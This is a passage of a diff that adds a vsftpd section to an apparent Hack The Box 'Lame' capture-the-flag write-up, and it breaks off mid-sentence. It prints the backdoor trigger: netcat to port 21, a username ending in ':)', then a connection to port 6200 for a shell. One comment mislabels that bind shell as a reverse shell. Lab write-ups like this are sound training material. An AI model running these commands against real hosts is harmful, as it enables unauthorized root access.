@@ -497,3 +497,20 @@ root@lame:/#
 ```
 
 As we can see in the above, it pops as root and it has been pwned. The shell is upgraded to bash with Python as well. 
+
+### vsftpd
+
+For vsftpd vulnerability, I attempted to break in as below. But initially it was no luck. 
+
+```bash
+# netcat to the target machine with ftp port 21
+nc 10.10.10.3 21
+# then type the username with :) at the end and whatever password to exploit the vuln
+USER tyla:)
+PASS tyla
+
+# listen to incoming reverse shell with nc
+nc 10.10.10.3 6200
+```
+
+Fortunately, I have a foothold into the target with samba thus I c
